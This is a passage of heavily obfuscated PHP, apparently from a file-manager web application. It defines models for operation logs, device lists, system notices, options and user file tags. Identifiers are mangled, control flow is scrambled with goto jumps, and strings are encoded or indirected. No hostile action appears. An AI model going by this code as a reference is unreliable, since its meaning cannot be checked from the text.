$F“µóĞØó[$F¸öŞÆà‹Š][$f÷ï’¶Á£´[405]] = json_encode($aÜ‘…¶½éô); goto E¹¼´Š±Ü; f¥Ì¹ø«¼¾: if (!isset($aÜ‘…¶½éô[$f÷ï’¶Á£´[75]]) || strpos($DËÊ—×Õ’®[$f÷ï’¶Á£´[29]], $f÷ï’¶Á£´[2474]) !== 0) { continue; } if (!IO::init($aÜ‘…¶½éô[$f÷ï’¶Á£´[75]])) { continue; } if (!($B¨¥·©»¶  = IO::infoFull($aÜ‘…¶½éô[$f÷ï’¶Á£´[75]]))) { continue; } goto D×¯Ÿ»®å‹; E¹¼´Š±Ü: continue; goto cÀ´½‚èÑ; cÀ´½‚èÑ: } goto d±êñ¡îùé; d±êñ¡îùé: $b¯†îæ½Œ[] = $aÜ‘…¶½éô[$f÷ï’¶Á£´[369]]; $b¯†îæ½Œ[] = $aÜ‘…¶½éô[$f÷ï’¶Á£´[2290]]; if ($aÜ‘…¶½éô[$f÷ï’¶Á£´[29]] == $f÷ï’¶Á£´[494]) { $b¯†îæ½Œ[] = $aÜ‘…¶½éô[$f÷ï’¶Á£´[405]][$f÷ï’¶Á£´[993]]; $b¯†îæ½Œ[] = $aÜ‘…¶½éô[$f÷ï’¶Á£´[405]][$f÷ï’¶Á£´[994]]; } goto d‰ÎŠ„; d‰ÎŠ„: if ($aÜ‘…¶½éô[$f÷ï’¶Á£´[29]] == $f÷ï’¶Á£´[2298]) { $b¯†îæ½Œ[] = $aÜ‘…¶½éô[$f÷ï’¶Á£´[405]][$f÷ï’¶Á£´[369]]; } goto B˜½÷Ò¯†ô; B˜½÷Ò¯†ô: } if (!$b¯†îæ½Œ) { return array(); } return Model($f÷ï’¶Á£´[734])->sourceListInfo($b¯†îæ½Œ, !0); } private function logList($bçÀ­÷²èƒ) { goto fóÜ„õÛÈØ; eö²Æ’¿à: return $F‡ÊåÍŠÂ; goto E±›…‹‡Œ; fóÜ„õÛÈØ: $Fµ”ò£´øÂ =& $_SERVER[í™]; $Bº’Ğî²©Ã = array_to_keyvalue($bçÀ­÷²èƒ, $Fµ”ò£´øÂ[33], $Fµ”ò£´øÂ[1423]); $B¸³ˆøš·ì = Model($Fµ”ò£´øÂ[479])->userListInfo(array_unique($Bº’Ğî²©Ã)); goto E˜ÆÙß›ä; dÛ‰¬è†Ö: $E”’îÀùÂÅ = array(); foreach ($bçÀ­÷²èƒ as $DŒÏ°‰Åˆö => $f‘µ„ºÜ„ğ) { goto Aƒê¤ÓÂ´È; E£‘™““–˜: $f‘µ„ºÜ„ğ[$Fµ”ò£´øÂ[2246]] = $böáØÇ¶²; $BÛĞÁåß£É = json_decode($f‘µ„ºÜ„ğ[$Fµ”ò£´øÂ[405]], !0); $f‘µ„ºÜ„ğ[$Fµ”ò£´øÂ[2470]] = isset($BÛĞÁåß£É[$Fµ”ò£´øÂ[2470]]) ? $BÛĞÁåß£É[$Fµ”ò£´øÂ[2470]] : $Fµ”ò£´øÂ[33]; goto Bœ¦Õî§ï; Bœ¦Õî§ï: $this->ipAddress($f‘µ„ºÜ„ğ); if (strpos($bˆ†ï¤ê‡, $Fµ”ò£´øÂ[2291]) === 0 || isset($BÛĞÁåß£É[$Fµ”ò£´øÂ[2290]])) { goto EÇİñÖ¤¹İ; cœˆÅ¦Ë¹ã: if ($BÛĞÁåß£É[$Fµ”ò£´øÂ[2303]] && $BÛĞÁåß£É[$Fµ”ò£´øÂ[2303]][$Fµ”ò£´øÂ[371]] == $Fµ”ò£´øÂ[1066]) { $E”’îÀùÂÅ[] = $f‘µ„ºÜ„ğ[$Fµ”ò£´øÂ[367]]; unset($bçÀ­÷²èƒ[$DŒÏ°‰Åˆö]); continue; } goto fÖ›°±ÑË; EÇİñÖ¤¹İ: $BÛĞÁåß£É[$Fµ”ò£´øÂ[391]] = $eªÒË®ñ‹[$BÛĞÁåß£É[$Fµ”ò£´øÂ[369]]]; $BÛĞÁåß£É[$Fµ”ò£´øÂ[2303]] = $eªÒË®ñ‹[$BÛĞÁåß£É[$Fµ”ò£´øÂ[2290]]]; if ($BÛĞÁåß£É[$Fµ”ò£´øÂ[29]] == $Fµ”ò£´øÂ[494]) { $BÛĞÁåß£É[$Fµ”ò£´øÂ[405]][$Fµ”ò£´øÂ[993]] = $eªÒË®ñ‹[$BÛĞÁåß£É[$Fµ”ò£´øÂ[405]][$Fµ”ò£´øÂ[993]]]; $BÛĞÁåß£É[$Fµ”ò£´øÂ[405]][$Fµ”ò£´øÂ[994]] = $eªÒË®ñ‹[$BÛĞÁåß£É[$Fµ”ò£´øÂ[405]][$Fµ”ò£´øÂ[994]]]; } goto C¿…¶§¾£ª; C¿…¶§¾£ª: if ($BÛĞÁåß£É[$Fµ”ò£´øÂ[29]] == $Fµ”ò£´øÂ[2298]) { $BÛĞÁåß£É[$Fµ”ò£´øÂ[405]][$Fµ”ò£´øÂ[369]] = $eªÒË®ñ‹[$BÛĞÁåß£É[$Fµ”ò£´øÂ[405]][$Fµ”ò£´øÂ[369]]]; } if ($BÛĞÁåß£É[$Fµ”ò£´øÂ[29]] == $Fµ”ò£´øÂ[2060]) { $BÛĞÁåß£É[$Fµ”ò£´øÂ[2303]] = $BÛĞÁåß£É[$Fµ”ò£´øÂ[391]]; $BÛĞÁåß£É[$Fµ”ò£´øÂ[2290]] = $BÛĞÁåß£É[$Fµ”ò£´øÂ[2303]][$Fµ”ò£´øÂ[369]]; $BÛĞÁåß£É[$Fµ”ò£´øÂ[391]] = !1; $BÛĞÁåß£É[$Fµ”ò£´øÂ[369]] = $Fµ”ò£´øÂ[33]; } if ($BÛĞÁåß£É[$Fµ”ò£´øÂ[391]] && $BÛĞÁåß£É[$Fµ”ò£´øÂ[391]][$Fµ”ò£´øÂ[371]] == $Fµ”ò£´øÂ[1066]) { $E”’îÀùÂÅ[] = $f‘µ„ºÜ„ğ[$Fµ”ò£´øÂ[367]]; unset($bçÀ­÷²èƒ[$DŒÏ°‰Åˆö]); continue; } goto cœˆÅ¦Ë¹ã; fÖ›°±ÑË: } $f‘µ„ºÜ„ğ[$Fµ”ò£´øÂ[405]] = $BÛĞÁåß£É; goto A„¸Õ“ç£Œ; Aƒê¤ÓÂ´È: $bˆ†ï¤ê‡ = $f‘µ„ºÜ„ğ[$Fµ”ò£´øÂ[29]]; $böáØÇ¶² = isset($B¸³ˆøš·ì[$f‘µ„ºÜ„ğ[$Fµ”ò£´øÂ[1423]]]) ? $B¸³ˆøš·ì[$f‘µ„ºÜ„ğ[$Fµ”ò£´øÂ[1423]]] : !1; $B¦à÷‹‡ã = strpos($bˆ†ï¤ê‡, $Fµ”ò£´øÂ[2475]) === 0 ? LNG($Fµ”ò£´øÂ[2476]) : LNG($Fµ”ò£´øÂ[2471]); goto bÏ¦Ï¯ªö; A„¸Õ“ç£Œ: unset($f‘µ„ºÜ„ğ[$Fµ”ò£´øÂ[2477]]); $F‡ÊåÍŠÂ[] = $f‘µ„ºÜ„ğ; goto Fˆ†ï ª„¹; bÏ¦Ï¯ªö: $f‘µ„ºÜ„ğ[$Fµ”ò£´øÂ[28]] = isset($böáØÇ¶²[$Fµ”ò£´øÂ[28]]) ? $böáØÇ¶²[$Fµ”ò£´øÂ[28]] : LNG($Fµ”ò£´øÂ[2471]); $f‘µ„ºÜ„ğ[$Fµ”ò£´øÂ[2339]] = isset($böáØÇ¶²[$Fµ”ò£´øÂ[2339]]) ? $böáØÇ¶²[$Fµ”ò£´øÂ[2339]] : $Fµ”ò£´øÂ[33]; $f‘µ„ºÜ„ğ[$Fµ”ò£´øÂ[1328]] = isset($cöôêË¡ö[$bˆ†ï¤ê‡]) ? $cöôêË¡ö[$bˆ†ï¤ê‡] : $B¦à÷‹‡ã; goto E£‘™““–˜; Fˆ†ï ª„¹: } $this->clearSystemPathLog($E”’îÀùÂÅ); goto eö²Æ’¿à; E˜ÆÙß›ä: $eªÒË®ñ‹ = $this->getSourceList($bçÀ­÷²èƒ); $cöôêË¡ö = $this->typeAll(); $F‡ÊåÍŠÂ = array(); goto dÛ‰¬è†Ö; E±›…‹‡Œ: } private function clearSystemPathLog($BÃ®‹Úˆ¼Ø) { $fˆç†¹é =& $_SERVER[í™]; if (count($BÃ®‹Úˆ¼Ø) == 0) { return; } $Cğ†õÚ½é¨ = array($fˆç†¹é[367] => array($fˆç†¹é[7], array_unique($BÃ®‹Úˆ¼Ø))); $this->where($Cğ†õÚ½é¨)->delete(); } public function deviceList($d¼ŒŠäîßÊ, $eÉ‚ÌÉÄ‹† = 0) { $f·™£‘Ò‘Ñ =& $_SERVER[í™]; $bÆ¨÷ò¹Ñ… = array($f·™£‘Ò‘Ñ[1423] => $d¼ŒŠäîßÊ, $f·™£‘Ò‘Ñ[187] => array($f·™£‘Ò‘Ñ[913], $eÉ‚ÌÉÄ‹†), $f·™£‘Ò‘Ñ[29] => $f·™£‘Ò‘Ñ[2033]); $EõÒ¹ˆ˜Í½ = array(); $c£² ½Å˜¿ = $this->field($f·™£‘Ò‘Ñ[2478])->where($bÆ¨÷ò¹Ñ…)->order($f·™£‘Ò‘Ñ[2301])->limit(50)->select(); foreach ($c£² ½Å˜¿ as $bÌí¡•Ê´İ => $D«ßÑØŞµÓ) { goto DÌÈ‹í¶…Ù; c …§ïì¾: unset($añÖ¾ºÄÚ[$f·™£‘Ò‘Ñ[2470]]); $DÙÃ³±œ·á = $this->deviceType($añÖ¾ºÄÚ[$f·™£‘Ò‘Ñ[2292]]); if (isset($EõÒ¹ˆ˜Í½[$DÙÃ³±œ·á])) { continue; } goto fì¹ŒñÁó; DÌÈ‹í¶…Ù: if ($bÌí¡•Ê´İ > 0 && abs($D«ßÑØŞµÓ[$f·™£‘Ò‘Ñ[187]] - $c£² ½Å˜¿[$bÌí¡•Ê´İ - 1][$f·™£‘Ò‘Ñ[187]]) < 5) { continue; } $añÖ¾ºÄÚ = json_decode($D«ßÑØŞµÓ[$f·™£‘Ò‘Ñ[405]], !0); $D«ßÑØŞµÓ[$f·™£‘Ò‘Ñ[2470]] = isset($añÖ¾ºÄÚ[$f·™£‘Ò‘Ñ[2470]]) ? $añÖ¾ºÄÚ[$f·™£‘Ò‘Ñ[2470]] : $f·™£‘Ò‘Ñ[33]; goto c …§ïì¾; fì¹ŒñÁó: $this->ipAddress($D«ßÑØŞµÓ); $D«ßÑØŞµÓ[$f·™£‘Ò‘Ñ[405]] = $añÖ¾ºÄÚ; $EõÒ¹ˆ˜Í½[$DÙÃ³±œ·á] = $D«ßÑØŞµÓ; goto DƒêÌÀ“¸“; DƒêÌÀ“¸“: } return array_values($EõÒ¹ˆ˜Í½); } public function deviceType($C©ÍĞ¥°ó–) { return $C©ÍĞ¥°ó–; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\x6e\157\164\151\143\145\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x63\157\156\x74\x65\156\x74", "\141\165\x74\150", "\x6d\157\x64\x65", "\164\151\155\x65", "\164\171\x70\x65", "\x6c\145\166\145\x6c", "\145\x6e\141\x62\154\145", "\163\157\162\164"); public function listData($dó’”Ò‚“ = false, $C´‚ ¢¤„ = "\163\x6f\162\x74", $dÕ‚ğÑß­ô = false) { return parent::listData($dó’”Ò‚“, $C´‚ ¢¤„, $dÕ‚ğÑß­ô); } public function add($AÊî´ñ–) { $cµÊ“‰¨ =& $_SERVER[í™]; $cˆ³¹Œçö… = time(); if ($AÊî´ñ–[$cµÊ“‰¨[12]] == $cµÊ“‰¨[2479]) { $cˆ³¹Œçö… = strtotime($AÊî´ñ–[$cµÊ“‰¨[190]]); } $AÊî´ñ–[$cµÊ“‰¨[190]] = $cˆ³¹Œçö…; return parent::insert($AÊî´ñ–); } public function update($A‹ØÀË‰Ã, $E„ùÀ„é¤) { goto cù»ƒ……™; Fœò­çÚ: return parent::update($A‹ØÀË‰Ã, $E„ùÀ„é¤); goto a›¿–â’¹”; cù»ƒ……™: $fŞÖíì·¡µ =& $_SERVER[í™]; $dÀÂÃ¾›»Ï = $this->listData($A‹ØÀË‰Ã); if (!$dÀÂÃ¾›»Ï) { return !1; } goto B˜î•àªĞ; B˜î•àªĞ: $AñËÍÔ†ˆ = time(); if ($E„ùÀ„é¤[$fŞÖíì·¡µ[12]] == $fŞÖíì·¡µ[2479]) { $AñËÍÔ†ˆ = strtotime($E„ùÀ„é¤[$fŞÖíì·¡µ[190]]); } $E„ùÀ„é¤[$fŞÖíì·¡µ[190]] = $AñËÍÔ†ˆ; goto Fœò­çÚ; a›¿–â’¹”: } public function remove($cª¥Ò†¹») { $CßİØğÖ = $this->listData($cª¥Ò†¹»); if (!$CßİØğÖ || $CßİØğÖ[$_SERVER[í™][1066]]) { return !1; } return parent::remove($cª¥Ò†¹»); } public function sort($a¼´Ûˆ®ñ¾, $a˜½–ñ«Ë) { return parent::update($a¼´Ûˆ®ñ¾, $a˜½–ñ«Ë); } public function enable($f‹¿¶ëµ‡´, $b˜ÆÇ…Æ¤) { return parent::update($f‹¿¶ëµ‡´, array($_SERVER[í™][2480] => $b˜ÆÇ…Æ¤)); } private function initUserOption() { $føİâƒ¦‘ø =& $_SERVER[í™]; $this->optionType = $føİâƒ¦‘ø[2481]; $this->modelType = $føİâƒ¦‘ø[2482]; $this->field = array($føİâƒ¦‘ø[2483], $føİâƒ¦‘ø[28], $føİâƒ¦‘ø[190], $føİâƒ¦‘ø[29], $føİâƒ¦‘ø[2484], $føİâƒ¦‘ø[671], $føİâƒ¦‘ø[183]); } public function userNoticeGet($D“Úõ±ŒÇ = false) { $this->initUserOption(); return parent::listData($D“Úõ±ŒÇ, $_SERVER[í™][367], !0); } public function userNoticeAdd($CÎ·¸›’’) { $bš˜Ó‡öè¶ =& $_SERVER[í™]; $this->initUserOption(); $eØÔ×Îãà· = $this->findByKey($bš˜Ó‡öè¶[2483], $CÎ·¸›’’[$bš˜Ó‡öè¶[367]]); if ($eØÔ×Îãà·) { return !0; } $C¶Îğ­òáˆ = array($bš˜Ó‡öè¶[2483] => $CÎ·¸›’’[$bš˜Ó‡öè¶[367]], $bš˜Ó‡öè¶[28] => $CÎ·¸›’’[$bš˜Ó‡öè¶[28]], $bš˜Ó‡öè¶[190] => $CÎ·¸›’’[$bš˜Ó‡öè¶[190]], $bš˜Ó‡öè¶[29] => isset($CÎ·¸›’’[$bš˜Ó‡öè¶[29]]) ? $CÎ·¸›’’[$bš˜Ó‡öè¶[29]] : 1, $bš˜Ó‡öè¶[2484] => isset($CÎ·¸›’’[$bš˜Ó‡öè¶[2484]]) ? $CÎ·¸›’’[$bš˜Ó‡öè¶[2484]] : 0, $bš˜Ó‡öè¶[671] => 0, $bš˜Ó‡öè¶[183] => 0); return parent::insert($C¶Îğ­òáˆ); } public function userNoticeEdit($f¶¨¼¾ÑÁ, $E²­´ÛÖ×‚) { $this->initUserOption(); return parent::update($f¶¨¼¾ÑÁ, $E²­´ÛÖ×‚); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\145\x6d\x5f\x6f\x70\164\x69\157\x6e"; protected $jsonField = array("\x6d\145\156\x75", "\x72\157\x6c\145", "\x72\x6f\x6c\x65\107\162\157\x75\x70", "\162\x65\x67\x69\163\x74", "\x65\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($BÓÓ’Êª‚×) { return "\123\x79\163\x74\x65\155\117\x70\x74\151\x6f\156\137{$BÓÓ’Êª‚×}"; } protected function optionDefault($fÈµ®‚§°« = '') { $d–èİ¶®¥› =& $_SERVER[í™]; if ($fÈµ®‚§°« == $d–èİ¶®¥›[33]) { return $GLOBALS[$d–èİ¶®¥›[6]][$d–èİ¶®¥›[2485]]; } } } goto EÀåİÏÍ; BƒëƒÎ°ÑÕ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\x66\x61\166"; protected function cacheFunctionAlias($Fù›¦œÚÊ£) { $e„ƒ„»Õ Ş =& $_SERVER[í™]; return array($e„ƒ„»Õ Ş[2189] => array(USER_ID, $e„ƒ„»Õ Ş[2190])); } protected function listData() { $aˆœ™Šé˜ =& $_SERVER[í™]; $d¯¨ÛÉ¤÷Æ = array($aˆœ™Šé˜[1414] => USER_ID, $aˆœ™Šé˜[436] => array($aˆœ™Šé˜[2193], 0)); $dğ‰•Öç†„ = $aˆœ™Šé˜[2195]; $C·é‰¿‚†Š = $this->field($dğ‰•Öç†„)->where($d¯¨ÛÉ¤÷Æ)->order($aˆœ™Šé˜[2196])->select(); return $C·é‰¿‚†Š ? $C·é‰¿‚†Š : array(); } protected function listByTag($b…Éîç£Û…) { } protected function addToTag($eì¡íÌ¥å¢, $A¿ˆ‹‹–“÷) { $eíŠ˜í³‚ù =& $_SERVER[í™]; if (!Model($eíŠ˜í³‚ù[2319])->listData($A¿ˆ‹‹–“÷) || !Model($eíŠ˜í³‚ù[734])->pathInfo($eì¡íÌ¥å¢)) { return !1; } $FÆµ¯ŸªÊ  = array($eíŠ˜í³‚ù[1414] => USER_ID, $eíŠ˜í³‚ù[436] => $A¿ˆ‹‹–“÷, $eíŠ˜í³‚ù[387] => $eì¡íÌ¥å¢, $eíŠ˜í³‚ù[388] => $eíŠ˜í³‚ù[382], $eíŠ˜í³‚ù[386] => $eíŠ˜í³‚ù[33], $eíŠ˜í³‚ù[2098] => 0); if ($this->where($FÆµ¯ŸªÊ )->find()) { return !1; } return $this->add($FÆµ¯ŸªÊ ); } protected function removeFromTag($aÚÒ²ˆ±‹®, $BÊ¨åËùã¨) { $d´õØ™Ú’ =& $_SERVER[í™]; if (!Model($d´õØ™Ú’[2319])->listData($BÊ¨åËùã¨)) { return !1; } if (is_array($aÚÒ²ˆ±‹®)) { $aÚÒ²ˆ±‹® = array($d´õØ™Ú’[7], $aÚÒ²ˆ±‹®); } $bÔ–‚ÍÚ„í = array($d´õØ™Ú’[1414] => USER_ID, $d´õØ™Ú’[436] => $BÊ¨åËùã¨, $d´õØ™Ú’[388] => $d´õØ™Ú’[382], $d´õØ™Ú’[387] => $aÚÒ²ˆ±‹®); return $this->where($bÔ–‚ÍÚ„í)->delete(); } protected function removeByTag($eÉ“Öœâ‰©) { $FÚè¿Âğ¹ =& $_SERVER[í™]; if (!$eÉ“Öœâ‰©) { return !1; } $fğæîõµĞ = array($FÚè¿Âğ¹[1414] => USER_ID, $FÚè¿Âğ¹[436] => $eÉ“Öœâ‰©); return $this->where($fğæîõµĞ)->delete(); } protected function removeBySource($a›Şõ„Ë•Ì) { $AÑäŒ”òòÉ =& $_SERVER[í™]; if (is_array($a›Şõ„Ë•Ì)) { $a›Şõ„Ë•Ì = array($AÑäŒ”òòÉ[7], $a›Şõ„Ë•Ì); } $aó÷˜Õ  = array($AÑäŒ”òòÉ[1414] => USER_ID, $AÑäŒ”òòÉ[387] => $a›Şõ„Ë•Ì, $AÑäŒ”òòÉ[436] => array($AÑäŒ”òòÉ[913], 0)); return $this->where($aó÷˜Õ )->delete(); } }